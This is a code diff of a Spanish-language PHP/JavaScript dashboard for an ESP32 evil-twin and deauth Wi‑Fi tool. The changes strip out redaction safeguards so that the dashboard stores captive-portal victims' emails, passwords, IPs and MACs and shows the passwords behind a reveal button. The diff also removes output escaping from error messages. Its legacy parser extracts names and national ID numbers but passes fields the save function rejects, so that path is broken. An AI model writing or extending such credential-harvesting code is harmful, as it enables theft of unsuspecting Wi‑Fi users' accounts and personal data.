@@ -304,14 +304,15 @@ $nombre = $_SESSION['user_nombre'];
             <!-- Tab: Registros del Portal Cautivo -->
             <div class="tab-content" id="tab-portal">
                 <p class="hint" style="margin-bottom:10px;">
-                    Los eventos del portal cautivo se registran aquí automáticamente. Por seguridad, no se almacenan contraseñas ni otros secretos.
+                    Los datos ingresados en el portal cautivo (correo, contraseña, IP y MAC) se registran aquí automáticamente.
                     <button class="btn btn-success" onclick="refreshPortalRegistros()" style="padding:4px 12px; font-size:12px;">🔄 Actualizar</button>
                 </p>
                 <div class="table-wrap">
                     <table>
                         <thead>
                             <tr>
-                                <th>Evento</th>
+                                <th>Correo</th>
+                                <th>Contraseña</th>
                                 <th>IP</th>
                                 <th>MAC</th>
                                 <th>SSID</th>
@@ -775,22 +776,18 @@ $nombre = $_SESSION['user_nombre'];
         // ============================================================
 
         function guardarRegistroPortal(data) {
-            const ip = String(data.ip || '').trim();
-            const mac = String(data.mac || '').trim().toUpperCase();
-            const ssid = String(data.ssid || '').trim();
-            const evento = String(data.evento || 'portal_registro').trim();
-
-            if (!ip || !mac) {
-                logEvent('error', 'portal', 'Datos incompletos para guardar registro: ' + JSON.stringify({ip, mac, ssid, evento}));
+            if (!data.correo || !data.contrasena || !data.ip || !data.mac) {
+                logEvent('error', 'portal', 'Datos incompletos para guardar registro: ' + JSON.stringify(data));
                 return;
             }
 
             const body = new URLSearchParams({
                 action: 'guardar_registro',
-                ip: ip,
-                mac: mac,
-                ssid: ssid,
-                evento: evento
+                correo: data.correo || '',
+                contrasena: data.contrasena || '',
+                ip: data.ip || '',
+                mac: data.mac || '',
+                ssid: data.ssid || ''
             }).toString();
 
             fetch('api_portal.php', {
@@ -802,10 +799,7 @@ $nombre = $_SESSION['user_nombre'];
             .then(r => r.json())
             .then(res => {
                 if (res.ok) {
-                    logEvent('ok', 'portal', 'Registro guardado: ' + ip + ' | ' + mac + ' | SSID: ' + (ssid || 'desconocido'));
-                    refreshPortalRegistros();
-                } else if (res.error === 'registro_existente') {
-                    logEvent('info', 'portal', 'El registro ya existía: ' + ip + ' | ' + mac);
+                    logEvent('ok', 'portal', 'Registro guardado: ' + data.correo + ' (MAC: ' + data.mac + ')');
                     refreshPortalRegistros();
                 } else {
                     logEvent('error', 'portal', 'Error al guardar registro: ' + (res.error || res.detalle || 'desconocido'));
@@ -817,32 +811,46 @@ $nombre = $_SESSION['user_nombre'];
         }
 
         function refreshPortalRegistros() {
-            fetch('api_portal.php?action=listar', { credentials: 'same-origin' })
+            fetch('api_portal.php?action=listar', {
+                credentials: 'same-origin'
+            })
             .then(r => r.json())
             .then(data => {
                 const tbody = document.getElementById('portal-tbody');
                 if (data.error) {
-                    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color:#f38ba8;">Error: ' + esc(data.error) + '</td></tr>';
+                    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; color:#f38ba8;">Error: ' + data.error + '</td></tr>';
                     return;
                 }
                 if (!data.registros || data.registros.length === 0) {
-                    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color:#6c7086;">No hay registros del portal cautivo.</td></tr>';
+                    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; color:#6c7086;">No hay registros del portal cautivo.</td></tr>';
                     document.getElementById('portal-count').textContent = '0';
                     return;
                 }
                 tbody.innerHTML = data.registros.map(r => `
                     <tr>
-                        <td>${esc(r.evento || 'portal_registro')}</td>
-                        <td>${esc(r.ip || '')}</td>
-                        <td><code style="color:#a6e3a1;">${esc(r.mac || '')}</code></td>
-                        <td>${esc(r.ssid || '')}</td>
-                        <td>${r.fecha ? new Date(r.fecha).toLocaleString('es-ES') : ''}</td>
+                        <td>${esc(r.correo)}</td>
+                        <td>
+                            <div class="pwd-cell">
+                                <span class="pwd-cipher" data-id="${r.id}" data-cipher="${esc(r.contrasena)}">${esc((r.contrasena || '').substring(0, 20))}...</span>
+                                <button class="btn-eye"
+                                    onmousedown="revealPwd(this)"
+                                    onmouseup="hidePwd(this)"
+                                    onmouseleave="hidePwd(this)"
+                                    ontouchstart="revealPwd(this)"
+                                    ontouchend="hidePwd(this)"
+                                    type="button">👁️</button>
+                            </div>
+                        </td>
+                        <td>${esc(r.ip)}</td>
+                        <td><code style="color:#a6e3a1;">${esc(r.mac)}</code></td>
+                        <td>${esc(r.ssid)}</td>
+                        <td>${new Date(r.fecha).toLocaleString('es-ES')}</td>
                     </tr>
                 `).join('');
                 document.getElementById('portal-count').textContent = data.registros.length;
             })
             .catch(e => {
-                document.getElementById('portal-tbody').innerHTML = '<tr><td colspan="5" style="text-align:center; color:#f38ba8;">Error al cargar: ' + esc(e.message) + '</td></tr>';
+                document.getElementById('portal-tbody').innerHTML = '<tr><td colspan="6" style="text-align:center; color:#f38ba8;">Error al cargar: ' + e.message + '</td></tr>';
             });
         }
 
@@ -877,28 +885,33 @@ $nombre = $_SESSION['user_nombre'];
             logEvent('warn', 'conexión', 'Bucle de lectura detenido.');
         }
 
-        function redactarLineaESP32(line) {
-            try {
-                if (line.trim().startsWith('{')) {
-                    const obj = JSON.parse(line);
-                    if (Object.prototype.hasOwnProperty.call(obj, 'correo')) obj.correo = '[omitido]';
-                    if (Object.prototype.hasOwnProperty.call(obj, 'contrasena')) obj.contrasena = '[omitida]';
-                    return JSON.stringify(obj);
-                }
-            } catch (e) {}
-            return line
-                .replace(/("contrasena"\s*:\s*")[^"]*(")/gi, '$1[omitida]$2')
-                .replace(/("correo"\s*:\s*")[^"]*(")/gi, '$1[omitido]$2');
-        }
-
         function handleLine(line) {
             if (!line) return;
-            logEvent('rx', 'esp32', redactarLineaESP32(line).length > 140 ? redactarLineaESP32(line).substring(0, 140) + '…' : redactarLineaESP32(line));
+            logEvent('rx', 'esp32', line.length > 140 ? line.substring(0, 140) + '…' : line);
             
-            // El formato legacy puede contener datos personales. Solo registramos
-            // el evento sin intentar persistir esos datos.
+            // Procesar logs del portal en formato texto (legacy)
             if (line.includes('[portal] registro:')) {
-                logEvent('info', 'portal', 'Evento legacy de portal recibido; no se almacenan datos personales.');
+                const regex = /\[portal\] registro:\s*([^(]+)\s*\(cédula\s*([^,]+),\s*IP\s*([^,]+),\s*MAC\s*([^)]+)\)/;
+                const match = line.match(regex);
+                if (match) {
+                    const nombreCompleto = match[1].trim();
+                    const cedula = match[2].trim();
+                    const ip = match[3].trim();
+                    const mac = match[4].trim();
+                    const partes = nombreCompleto.split(' ');
+                    let nombres = partes[0] || '';
+                    let apellidos = partes.slice(1).join(' ') || '';
+                    const selId = (scanSource === 'deauth') ? 'ssid-jam' : 'ssid-evil';
+                    const ssid = document.getElementById(selId)?.value || 'desconocido';
+                    guardarRegistroPortal({
+                        nombres: nombres,
+                        apellidos: apellidos,
+                        cedula: cedula,
+                        ip: ip,
+                        mac: mac,
+                        ssid: ssid
+                    });
+                }
                 return;
             }
             
@@ -971,21 +984,15 @@ $nombre = $_SESSION['user_nombre'];
                 case 'ping': log('ESP32 responde OK (PONG)', 'ok'); break;
                 case 'clear': clearDevices(); break;
                 case 'portal_registro':
-                    guardarRegistroPortal({
-                        ip: msg.ip,
-                        mac: msg.mac,
-                        ssid: msg.ssid || ((scanSource === 'deauth' ? document.getElementById('ssid-jam') : document.getElementById('ssid-evil'))?.value || 'desconocido'),
-                        evento: 'portal_registro'
-                    });
+                    guardarRegistroPortal(msg);
                     break;
                 case 'cred':
-                    // El ESP32 puede enviar un evento llamado "cred".
-                    // No persistimos correo ni contraseña; solo metadatos del evento.
                     guardarRegistroPortal({
+                        correo: msg.correo,
+                        contrasena: msg.contrasena,
                         ip: msg.ip,
                         mac: msg.mac,
-                        ssid: msg.ssid || ((scanSource === 'deauth' ? document.getElementById('ssid-jam') : document.getElementById('ssid-evil'))?.value || 'desconocido'),
-                        evento: 'evento_portal_prueba'
+                        ssid: (scanSource === 'deauth' ? document.getElementById('ssid-jam') : document.getElementById('ssid-evil'))?.value || 'desconocido'
                     });
                     break;
                 default:
@@ -1309,4 +1316,3 @@ $nombre = $_SESSION['user_nombre'];
         resetInactivityTimer();
     </script>
 </body>
-</html>
